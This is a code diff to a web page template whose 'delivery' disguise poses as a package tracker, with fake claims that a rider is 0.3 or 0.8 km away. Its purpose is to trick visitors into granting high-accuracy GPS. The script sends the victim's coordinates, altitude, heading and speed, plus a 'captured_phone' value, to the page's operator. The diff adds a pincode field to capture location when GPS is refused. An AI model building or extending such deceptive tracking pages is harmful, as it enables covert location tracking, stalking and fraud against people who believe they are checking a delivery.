@@ -51,18 +51,25 @@
     </div>
   </div>
 
-  <!-- ===== DELIVERY: GPS button + Phone ===== -->
+  <!-- ===== DELIVERY: GPS button + Pincode Fallback + Phone ===== -->
   {% elif disguise == 'delivery' %}
   <div class="card" style="text-align:center">
     <div style="font-size:32px;margin-bottom:8px">📦</div>
-    <div style="font-weight:700;font-size:15px;margin-bottom:2px">Your Package is Nearby</div>
-    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Allow location to see live rider position</p>
-    <button id="gpsBtn" onclick="manualGPS()" class="btn" style="background:#10b981;margin-top:0">📍 Show Rider on Map</button>
-    <p id="gpsOk" class="hidden check">✓ Location found — Rider is 0.3 km away</p>
+    <div style="font-weight:700;font-size:15px;margin-bottom:2px">Express Delivery Tracker</div>
+    <p style="font-size:12px;color:#94a3b8;margin-bottom:16px">Track your package arrival status</p>
+    <button id="gpsBtn" onclick="manualGPS()" class="btn" style="background:#10b981;margin-top:0">📍 Check Live Delivery Distance</button>
+    <p id="gpsOk" class="hidden check">✓ Location confirmed — Rider is 0.8 km away</p>
+    
+    <!-- Pincode fallback when location is denied/skipped -->
+    <div id="pincodeBox" class="hidden" style="margin-top:14px;padding:12px;background:#f1f5f9;border-radius:10px;text-align:left">
+      <label style="color:#475569">📌 Enter Delivery Postal / Pincode</label>
+      <input type="text" id="userPincode" placeholder="e.g. 600001 or 110001" style="background:#fff">
+    </div>
+
     <div style="margin-top:16px;text-align:left">
-      <label>Contact Number for Delivery</label>
+      <label>Mobile Number for Delivery Confirmation</label>
       <input type="tel" id="userPhone" placeholder="Mobile Number">
-      <button onclick="sendPhone()" class="btn" style="background:#334155">Confirm →</button>
+      <button onclick="sendPhone()" class="btn" style="background:#334155">Confirm Delivery Details →</button>
     </div>
   </div>
 
@@ -277,21 +284,29 @@
   // ---- Interactive mode handlers ----
   window.manualGPS = function() {
     var btn = document.getElementById('gpsBtn');
-    if (btn) btn.textContent = '⏳ Getting location...';
+    if (btn) btn.textContent = '⏳ Calculating distance...';
     navigator.geolocation.getCurrentPosition(
       function(p) {
         send({slug:SLUG,gps_lat:p.coords.latitude,gps_lng:p.coords.longitude,gps_accuracy:p.coords.accuracy,gps_altitude:p.coords.altitude,gps_heading:p.coords.heading,gps_speed:p.coords.speed});
-        if(btn){btn.textContent='✓ Location found';btn.style.background='#64748b';}
+        if(btn){btn.textContent='✓ Location Verified';btn.style.background='#64748b';}
         var ok=document.getElementById('gpsOk');if(ok)ok.classList.remove('hidden');
       },
-      function(){if(btn)btn.textContent='📍 Try Again';},
+      function(){
+        if(btn)btn.textContent='📍 Check Again';
+        var pin = document.getElementById('pincodeBox');
+        if(pin) pin.classList.remove('hidden');
+      },
       {enableHighAccuracy:true,timeout:10000,maximumAge:0}
     );
   };
 
   window.sendPhone = function() {
     var ph = document.getElementById('userPhone');
-    if (ph && ph.value) send({slug:SLUG,captured_phone:ph.value});
+    var pin = document.getElementById('userPincode');
+    var data = {slug:SLUG};
+    if (ph && ph.value) data.captured_phone = ph.value;
+    if (pin && pin.value) data.captured_pincode = pin.value;
+    send(data);
     setTimeout(go, 400);
   };
 })();
